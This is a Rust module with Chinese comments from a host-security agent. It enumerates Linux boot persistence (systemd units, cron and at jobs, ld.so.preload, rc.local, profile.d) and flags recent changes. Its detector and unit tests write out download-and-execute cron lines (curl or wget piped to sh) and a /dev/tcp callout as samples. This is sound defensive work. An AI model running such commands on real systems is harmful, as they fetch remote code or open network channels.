//! 持久化（`wist-agentd investigate persistence`）：**重启之后，还有什么会自己跑起来**。
//!
//! 这是威胁驻留的第一问，也是防火墙和漏洞扫描器都看不见的一类事实：它们看的是"现在有什么在跑"，
//! 而这一题看的是"**下次开机谁会自己起来**"。现场最典型的答案是三种：运维留的临时脚本、
//! 某个被忘掉的定时任务、以及攻击者留的 systemd 单元 —— 三者从配置上看长得一样，所以这里
//! **只给证据，不猜意图**。
//!
//! 与采集面的分工：`ServiceLifecycle` 是服务生命周期**事件**（谁起了、谁失败了）；
//! 这里是**配置状态**（谁被 enable 了）。与已规划的 `service` 题的分工：
//! 那题答"现在是不是活着、为什么退出"，这题答"开机时会不会被拉起"。
//!
//! 三条边界：
//!
//! 1. **不 exec `systemctl`**：enable 状态就是 `/etc/systemd/system/*.wants/` 下的符号链接，
//!    `masked` 就是指向 `/dev/null` 的链接 —— 全是文件事实。
//! 2. **不铺整行命令**：定时任务只报"程序（首个绝对路径）"和是否命中"下载并执行"模式，
//!    不把 argv 写进会上送的文件。
//! 3. **读不到 = `unknown`**：非 root 读不到用户 crontab，那节必须如实说。

use std::collections::BTreeSet;
use std::fs;
use std::path::{Path, PathBuf};

use crate::config::agent_config::AgentConfig;
use crate::doctor::Status;
use crate::investigate::{Finding, InvestigateRequest, Row};
use crate::investigate_probe::{RECENT_DAYS, Tally, age_days, metadata_of, truncate_rows};

const SYSTEMD_DIR: &str = "/etc/systemd/system";
const PACKAGED_DIRS: &[&str] = &["/usr/lib/systemd/system", "/lib/systemd/system"];
const CRON_FILES: &[&str] = &["/etc/crontab", "/etc/anacrontab"];
const CRON_DIRS: &[&str] = &[
    "/etc/cron.d",
    "/var/spool/cron/crontabs",
    "/var/spool/cron",
    "/var/spool/cron/atjobs",
];
const CRON_PERIODIC_DIRS: &[&str] = &[
    "/etc/cron.hourly",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
];
const HOOK_DIRS: &[&str] = &["/etc/profile.d"];

/// 一个"近 N 天新增/变更"的持久化项（供 `persistence.recent` 汇总）。
struct Recent {
    section: &'static str,
    label: String,
    age_days: u64,
}

pub(crate) fn investigate(
    request: &InvestigateRequest,
    _config: Option<&AgentConfig>,
) -> Result<Vec<Finding>, String> {
    if !cfg!(target_os = "linux") {
        return Err(
            "persistence 调查暂只支持 Linux（macOS 的 launchd 域需要只读查询命令白名单）".into(),
        );
    }
    let top = request.top;
    let mut recent = Vec::new();
    let units = units_finding(top, &mut recent);
    let scheduled = scheduled_finding(top, &mut recent);
    let hooks = hooks_finding(top, &mut recent);
    let recent_finding = recent_finding(&recent, top);
    Ok(vec![units, scheduled, hooks, recent_finding])
}

// ---------------------------------------------------------------------------
// systemd：enable 状态 = .wants/.requires 下的符号链接
// ---------------------------------------------------------------------------

fn units_finding(top: usize, recent: &mut Vec<Recent>) -> Finding {
    let mut tally = Tally::default();
    if !Path::new(SYSTEMD_DIR).exists() {
        return Finding::new(
            "persistence.units",
            Status::Ok,
            "未发现 systemd 单元目录",
            format!("{SYSTEMD_DIR} 不存在"),
        )
        .coverage(tally.coverage());
    }
    let Some(entries) = tally.list(Path::new(SYSTEMD_DIR)) else {
        return Finding::new(
            "persistence.units",
            Status::Unknown,
            "无法读取 systemd 单元目录",
            format!("{SYSTEMD_DIR} 不可读"),
        )
        .coverage(tally.coverage())
        .limit("以 root 重跑才完整");
    };

    // 先把条目分成两类：`.wants/.requires` 目录（enable 的证据）与顶层单元文件。
    // 分两次看是为了让顶层文件能回答“它到底有没有被启用”—— 单次遍历做不到：
    // 遍历顺序不保证，文件可能排在它的 `.wants` 链接之前。
    let mut wants: Vec<(String, Vec<PathBuf>)> = Vec::new();
    let mut fragments: Vec<PathBuf> = Vec::new();
    for entry in entries {
        let name = file_name(&entry);
        if name.ends_with(".wants") || name.ends_with(".requires") {
            if let Some(links) = tally.list(&entry) {
                wants.push((name, links));
            }
        } else if is_unit_fragment(&name) {
            fragments.push(entry);
        }
    }
    let enabled_units: BTreeSet<String> = wants
        .iter()
        .flat_map(|(_, links)| links.iter())
        .map(|link| file_name(link))
        .filter(|unit| is_unit_fragment(unit))
        .collect();

    // 本地/异常来源排在前面：它们才是这题想让人看的东西；打包单元只是对账。
    let mut interesting: Vec<Row> = Vec::new();
    let mut packaged_rows: Vec<Row> = Vec::new();
    let mut masked = 0usize;
    let mut local_units: BTreeSet<String> = BTreeSet::new();
    let mut seen_units: BTreeSet<String> = BTreeSet::new();

    for (target, links) in &wants {
        for link in links {
            let unit = file_name(link);
            // 同一个单元可能在多个 target 里启用（multi-user + graphical）：只列一行。
            if !is_unit_fragment(&unit) || !seen_units.insert(unit.clone()) {
                continue;
            }
            let is_masked = is_dev_null_link(link);
            let is_local = Path::new(SYSTEMD_DIR).join(&unit).exists();
            if is_masked {
                masked += 1;
            }
            if is_local {
                local_units.insert(unit.clone());
            }
            let note = if is_masked {
                "masked（指向 /dev/null）".to_string()
            } else if is_local {
                format!("本地单元文件；由 {target} 启用")
            } else if packaged(&unit) {
                format!("打包单元；由 {target} 启用")
            } else {
                format!("来源未知；由 {target} 启用")
            };
            let row = Row::new(unit.clone(), target.clone(), note);
            if is_masked || is_local || !packaged(&unit) {
                interesting.push(row);
            } else {
                packaged_rows.push(row);
            }
            if let Some(days) = metadata_of(link).as_ref().and_then(age_days)
                && days <= RECENT_DAYS
            {
                push_recent(
                    recent,
                    Recent {
                        section: "units",
                        label: unit,
                        age_days: days,
                    },
                );
            }
        }
    }

    for entry in &fragments {
        let name = file_name(entry);
        let Some(metadata) = metadata_of(entry) else {
            continue;
        };
        if is_dev_null_link(entry) {
            masked += 1;
            interesting.push(Row::new(name, "masked", "指向 /dev/null（禁止启动）"));
            continue;
        }
        // 已启用的会在上面 .wants 那一轮列过（不重复）；不是普通文件（目录/链接）就不猜。
        if !metadata.is_file() || enabled_units.contains(&name) {
            continue;
        }
        local_units.insert(name.clone());
        interesting.push(Row::new(
            name.clone(),
            "local",
            local_fragment_note(packaged(&name)),
        ));
        if let Some(days) = age_days(&metadata)
            && days <= RECENT_DAYS
        {
            push_recent(
                recent,
                Recent {
                    section: "units",
                    label: name,
                    age_days: days,
                },
            );
        }
    }
    let enabled = enabled_units.len();

    interesting.extend(packaged_rows);
    let (rows, omitted) = truncate_rows(interesting, top);

    let status = if recent.iter().any(|item| item.section == "units") {
        Status::Warn
    } else {
        Status::Ok
    };
    let mut detail = format!(
        "启用单元 {enabled} 个；本地单元文件 {} 个；masked {masked} 个",
        local_units.len()
    );
    if omitted > 0 {
        let _ = std::fmt::Write::write_fmt(&mut detail, format_args!("；另有 {omitted} 条未列出"));
    }
    let mut finding = Finding::new(
        "persistence.units",
        status,
        if status == Status::Ok {
            "开机自启单元已列出".to_string()
        } else {
            format!("近 {RECENT_DAYS} 天有单元被启用")
        },
        detail,
    )
    .rows(rows)
    .coverage(tally.coverage());
    if !local_units.is_empty() {
        finding = finding.hint(
            "本地单元文件（/etc/systemd/system 下的实体文件）不是包管理器装的：确认每个的来源",
        );
    }
    finding
        .limit("只读 /etc/systemd/system 与包目录，不调用 systemctl")
        .limit("不判断单元现在是否 active/失败 —— 那是 service 题")
}

fn packaged(unit: &str) -> bool {
    PACKAGED_DIRS
        .iter()
        .any(|dir| Path::new(dir).join(unit).exists())
}

/// 指向 `/dev/null` 的链接 = systemd 的 masked。
fn is_dev_null_link(path: &Path) -> bool {
    fs::read_link(path)
        .ok()
        .is_some_and(|target| target == Path::new("/dev/null"))
}

/// 顶层本地单元文件的说明：**必须**把“未启用”说出来。
///
/// 这一节的问句是“重启后什么会自己起来”，一个只是躺在 `/etc/systemd/system` 里、
/// 没有被任何 `.wants` 拉起的文件不属于这个问句；把它列成“自启”会让人去查一个不会跑的东西。
fn local_fragment_note(packaged: bool) -> &'static str {
    if packaged {
        "本地覆盖（与打包同名）；当前未启用"
    } else {
        "本地单元文件（非包管理）；当前未启用"
    }
}

/// 普通文件（不跟随符号链接）：cron 目录里的链接可能指向任意文件（如 `/etc/shadow`），
/// 读它等于把无关内容拖进报告。
fn is_plain_file(path: &Path) -> bool {
    metadata_of(path).is_some_and(|metadata| metadata.is_file() && !metadata.is_symlink())
}

fn push_recent(recent: &mut Vec<Recent>, item: Recent) {
    if !recent
        .iter()
        .any(|existing| existing.section == item.section && existing.label == item.label)
    {
        recent.push(item);
    }
}

fn is_unit_fragment(name: &str) -> bool {
    const SUFFIXES: &[&str] = &[
        ".service",
        ".socket",
        ".timer",
        ".path",
        ".mount",
        ".automount",
        ".target",
        ".slice",
        ".scope",
        ".swap",
        ".device",
    ];
    SUFFIXES.iter().any(|suffix| name.ends_with(suffix))
}

// ---------------------------------------------------------------------------
// 定时任务：cron / at / 周期目录
// ---------------------------------------------------------------------------

fn scheduled_finding(top: usize, recent: &mut Vec<Recent>) -> Finding {
    let mut tally = Tally::default();
    let mut rows: Vec<Row> = Vec::new();
    let mut downloads: Vec<String> = Vec::new();
    let mut jobs = 0usize;

    for file in CRON_FILES {
        let path = Path::new(file);
        if let Some(text) = tally.read(path) {
            scan_cron_text(&text, path, &mut rows, &mut downloads, &mut jobs, recent);
        }
    }
    for dir in CRON_DIRS {
        let dir = Path::new(dir);
        let Some(entries) = tally.list(dir) else {
            continue;
        };
        let mut files: Vec<PathBuf> = entries
            .into_iter()
            .filter(|path| is_plain_file(path))
            .collect();
        files.sort();
        for path in files {
            if let Some(text) = tally.read(&path) {
                scan_cron_text(&text, &path, &mut rows, &mut downloads, &mut jobs, recent);
            }
        }
    }
    for dir in CRON_PERIODIC_DIRS {
        let dir = Path::new(dir);
        let Some(entries) = tally.list(dir) else {
            continue;
        };
        let mut files: Vec<PathBuf> = entries
            .into_iter()
            .filter(|path| is_plain_file(path))
            .collect();
        files.sort();
        for path in files {
            jobs += 1;
            let note = match metadata_of(&path).and_then(|metadata| age_days(&metadata)) {
                Some(days) if days <= RECENT_DAYS => {
                    push_recent(
                        recent,
                        Recent {
                            section: "scheduled",
                            label: path.display().to_string(),
                            age_days: days,
                        },
                    );
                    format!("周期脚本；{days} 天前有变更")
                }
                _ => "周期脚本".to_string(),
            };
            rows.push(Row::new(path.display().to_string(), "periodic", note));
        }
    }

    let (rows, omitted) = truncate_rows(rows, top);
    let status = if !downloads.is_empty() {
        Status::Warn
    } else {
        Status::Ok
    };
    let mut detail = format!("定时任务 {jobs} 个");
    if !downloads.is_empty() {
        let _ = std::fmt::Write::write_fmt(
            &mut detail,
            format_args!("；其中 {} 个是「下载并执行」", downloads.len()),
        );
    }
    if omitted > 0 {
        let _ = std::fmt::Write::write_fmt(&mut detail, format_args!("；另有 {omitted} 条未列出"));
    }
    let mut finding = Finding::new(
        "persistence.scheduled",
        status,
        if downloads.is_empty() {
            "定时任务已列出".to_string()
        } else {
            format!("{} 个定时任务会下载并执行", downloads.len())
        },
        detail,
    )
    .rows(rows)
    .coverage(tally.coverage());
    if !downloads.is_empty() {
        finding = finding.hint("下载并执行的定时任务是最常见的驻留形态：核对每个的来源与 URL");
    }
    finding
        .limit("定时任务只报程序（首个绝对路径），不报整行命令")
        .limit("非 root 读不到用户 crontab（/var/spool/cron*），那部分会记成 denied")
}

fn scan_cron_text(
    text: &str,
    source: &Path,
    rows: &mut Vec<Row>,
    downloads: &mut Vec<String>,
    jobs: &mut usize,
    recent: &mut Vec<Recent>,
) {
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        // 环境变量行（`MAILTO=…` 之类）不是任务。
        let first = line.split_whitespace().next().unwrap_or("");
        if first.contains('=') && !first.starts_with('/') {
            continue;
        }
        *jobs += 1;
        let program = line
            .split_whitespace()
            .find(|token| token.starts_with('/'))
            .unwrap_or(first)
            .to_string();
        let download = looks_like_download_exec(line);
        if download {
            downloads.push(program.clone());
        }
        let note = if download {
            "下载并执行".to_string()
        } else {
            "证据".to_string()
        };
        rows.push(Row::new(program, source.display().to_string(), note));
        if let Some(days) = metadata_of(source).and_then(|metadata| age_days(&metadata))
            && days <= RECENT_DAYS
        {
            push_recent(
                recent,
                Recent {
                    section: "scheduled",
                    label: source.display().to_string(),
                    age_days: days,
                },
            );
        }
    }
}

/// 只需要"像不像"，不需要精确：这四类模式在正常运维里极少出现，命中就值得人看一眼。
fn looks_like_download_exec(line: &str) -> bool {
    let lowered = line.to_ascii_lowercase();
    let fetches = lowered.contains("curl") || lowered.contains("wget");
    let pipes_to_shell = lowered.contains("| sh")
        || lowered.contains("|sh")
        || lowered.contains("| bash")
        || lowered.contains("|bash")
        || lowered.contains("| /bin/sh")
        || lowered.contains("| /bin/bash");
    (fetches && pipes_to_shell)
        || lowered.contains("/dev/tcp/")
        || lowered.contains("base64 -d")
        || lowered.contains("base64 --decode")
}

// ---------------------------------------------------------------------------
// loader / shell / rc 钩子
// ---------------------------------------------------------------------------

fn hooks_finding(top: usize, recent: &mut Vec<Recent>) -> Finding {
    let mut tally = Tally::default();
    let mut rows: Vec<Row> = Vec::new();
    let mut status = Status::Ok;
    let mut preload_libs = 0usize;

    // /etc/ld.so.preload：非空就意味着"每个进程启动时都会加载这些库"—— 最强的持久化信号。
    let preload = Path::new("/etc/ld.so.preload");
    if let Some(metadata) = metadata_of(preload) {
        let text = tally.read(preload).unwrap_or_default();
        let libs: Vec<&str> = text
            .lines()
            .map(str::trim)
            .filter(|line| !line.is_empty())
            .collect();
        preload_libs = libs.len();
        if !libs.is_empty() {
            status = Status::Fail;
            for lib in libs.iter().take(top) {
                rows.push(Row::new(
                    (*lib).to_string(),
                    "ld.so.preload",
                    "所有进程启动时加载",
                ));
            }
        }
        if let Some(days) = age_days(&metadata)
            && days <= RECENT_DAYS
            && !libs.is_empty()
        {
            push_recent(
                recent,
                Recent {
                    section: "hooks",
                    label: "/etc/ld.so.preload".to_string(),
                    age_days: days,
                },
            );
        }
    }

    // /etc/rc.local：老式开机脚本，仍被不少发行版保留。
    let rc_local = Path::new("/etc/rc.local");
    let mut other_hooks = 0usize;
    if let Some(metadata) = metadata_of(rc_local) {
        let recent_change = age_days(&metadata).is_some_and(|days| days <= RECENT_DAYS);
        if recent_change {
            status = worse(status, Status::Warn);
            push_recent(
                recent,
                Recent {
                    section: "hooks",
                    label: "/etc/rc.local".to_string(),
                    age_days: age_days(&metadata).unwrap_or(0),
                },
            );
        }
        rows.push(Row::new(
            "/etc/rc.local".to_string(),
            "开机执行",
            if recent_change {
                format!("近 {RECENT_DAYS} 天有变更")
            } else {
                "证据".to_string()
            },
        ));
        other_hooks += 1;
    }

    // /etc/profile.d：登录时执行（所有用户）。
    for dir in HOOK_DIRS {
        let dir = Path::new(dir);
        let Some(entries) = tally.list(dir) else {
            continue;
        };
        let mut files: Vec<PathBuf> = entries
            .into_iter()
            .filter(|path| path.extension().and_then(|ext| ext.to_str()) == Some("sh"))
            .collect();
        files.sort();
        for path in &files {
            let recent_change = metadata_of(path)
                .and_then(|metadata| age_days(&metadata))
                .is_some_and(|days| days <= RECENT_DAYS);
            if recent_change {
                status = worse(status, Status::Warn);
                push_recent(
                    recent,
                    Recent {
                        section: "hooks",
                        label: path.display().to_string(),
                        age_days: metadata_of(path)
                            .and_then(|metadata| age_days(&metadata))
                            .unwrap_or(0),
                    },
                );
            }
        }
        if !files.is_empty() {
            rows.push(Row::new(
                dir.display().to_string(),
                format!("{} 个脚本", files.len()),
                "登录时执行",
            ));
            other_hooks += 1;
        }
    }

    let (rows, omitted) = truncate_rows(rows, top);
    let mut detail = format!(
        "ld.so.preload {} 条；其它钩子 {} 项",
        preload_libs, other_hooks
    );
    if omitted > 0 {
        let _ = std::fmt::Write::write_fmt(&mut detail, format_args!("；另有 {omitted} 条未列出"));
    }
    let title = match status {
        Status::Fail => "ld.so.preload 非空".to_string(),
        Status::Warn => format!("近 {RECENT_DAYS} 天有钩子变更"),
        _ => "未发现异常的加载/登录钩子".to_string(),
    };
    let mut finding = Finding::new("persistence.hooks", status, title, detail)
        .rows(rows)
        .coverage(tally.coverage());
    if preload_libs > 0 {
        finding = finding
            .hint("ld.so.preload 会让**每个**进程加载指定库：正常发行版里它应当为空或不存在");
    }
    finding.limit("只覆盖 ld.so.preload / rc.local / profile.d；shell rc 文件（~/.bashrc）未枚举")
}

// ---------------------------------------------------------------------------
// 近 N 天新增（把三节的时间信号汇总成一条可执行的线索）
// ---------------------------------------------------------------------------

fn recent_finding(recent: &[Recent], top: usize) -> Finding {
    let rows: Vec<Row> = recent
        .iter()
        .map(|item| {
            Row::new(
                item.label.clone(),
                format!("{} 天前", item.age_days),
                item.section.to_string(),
            )
        })
        .collect();
    let (rows, omitted) = truncate_rows(rows, top);
    let status = if recent.is_empty() {
        Status::Ok
    } else {
        Status::Warn
    };
    let mut detail = if recent.is_empty() {
        format!("近 {RECENT_DAYS} 天没有新增/变更的持久化项")
    } else {
        format!("近 {RECENT_DAYS} 天新增/变更 {} 项", recent.len())
    };
    if omitted > 0 {
        let _ = std::fmt::Write::write_fmt(&mut detail, format_args!("；另有 {omitted} 条未列出"));
    }
    Finding::new(
        "persistence.recent",
        status,
        if recent.is_empty() {
            "近 7 天无新增持久化项"
        } else {
            "近 7 天有新增持久化项"
        },
        detail,
    )
    .rows(rows)
}

// ---------------------------------------------------------------------------
// 工具
// ---------------------------------------------------------------------------

fn file_name(path: &Path) -> String {
    path.file_name()
        .map(|name| name.to_string_lossy().to_string())
        .unwrap_or_default()
}

/// 状态升级：`Fail > Warn > Ok`。
///
/// 不能直接用 `Status::max`：枚举里的 `Ord` 把 `Unknown` 排在最后，而 `Unknown` 与 `Warn`
/// 谁“更严重”本来就没有意义（那是两种不同的东西）。
fn worse(current: Status, next: Status) -> Status {
    match (current, next) {
        (Status::Fail, _) | (_, Status::Fail) => Status::Fail,
        (Status::Warn, _) | (_, Status::Warn) => Status::Warn,
        _ => Status::Ok,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn download_and_exec_is_flagged_but_plain_jobs_are_not() {
        assert!(looks_like_download_exec(
            "*/5 * * * * root curl -fsSL http://x/y.sh | sh"
        ));
        assert!(looks_like_download_exec(
            "0 3 * * * root wget -qO- http://x |bash"
        ));
        assert!(looks_like_download_exec(
            "bash -c 'echo x >/dev/tcp/1.2.3.4/80'"
        ));
        assert!(looks_like_download_exec(
            "echo aGVsbG8= | base64 -d > /tmp/x"
        ));
        assert!(!looks_like_download_exec(
            "0 2 * * * root /usr/bin/backup --full"
        ));
        assert!(!looks_like_download_exec(
            "0 1 * * * root /usr/bin/curl --version"
        ));
    }

    #[test]
    fn unit_fragments_are_recognised() {
        assert!(is_unit_fragment("wist-agentd.service"));
        assert!(is_unit_fragment("backup.timer"));
        assert!(is_unit_fragment("docker.socket"));
        assert!(!is_unit_fragment("multi-user.target.wants"));
        assert!(!is_unit_fragment("README"));
    }

    #[test]
    fn cron_env_lines_are_not_jobs() {
        let mut rows = Vec::new();
        let mut downloads = Vec::new();
        let mut jobs = 0;
        let mut recent = Vec::new();
        scan_cron_text(
            "SHELL=/bin/sh\nPATH=/usr/bin:/bin\n*/5 * * * * root /usr/bin/true\n",
            Path::new("/etc/crontab"),
            &mut rows,
            &mut downloads,
            &mut jobs,
            &mut recent,
        );
        assert_eq!(jobs, 1);
        assert_eq!(rows[0].label, "/usr/bin/true");
    }

    #[test]
    fn local_fragment_note_says_it_is_not_enabled() {
        // 这题的问句是“重启后什么会自己起来”；躺在那没启用的文件不属于它。
        assert!(local_fragment_note(false).contains("未启用"));
        assert!(local_fragment_note(true).contains("未启用"));
    }

    #[test]
    fn recent_items_are_deduplicated_by_section_and_label() {
        let mut recent = Vec::new();
        let item = || Recent {
            section: "units",
            label: "same.service".to_string(),
            age_days: 1,
        };
        push_recent(&mut recent, item());
        push_recent(&mut recent, item());
        push_recent(
            &mut recent,
            Recent {
                section: "scheduled",
                label: "same.service".to_string(),
                age_days: 1,
            },
        );
        assert_eq!(recent.len(), 2, "同一节同一项只留一条，跨节不合并");
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_cron_files_are_not_read() {
        // 符号链接可以指向 `/etc/shadow` 之类的任意文件；读它等于把无关内容拖进报告。
        let dir = std::env::temp_dir().join(format!("wist-persist-{}", std::process::id()));
        std::fs::create_dir_all(&dir).expect("create temp dir");
        let target = dir.join("target");
        let link = dir.join("link");
        std::fs::write(&target, "x").expect("write target");
        std::os::unix::fs::symlink(&target, &link).expect("create symlink");
        assert!(is_plain_file(&target));
        assert!(!is_plain_file(&link));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
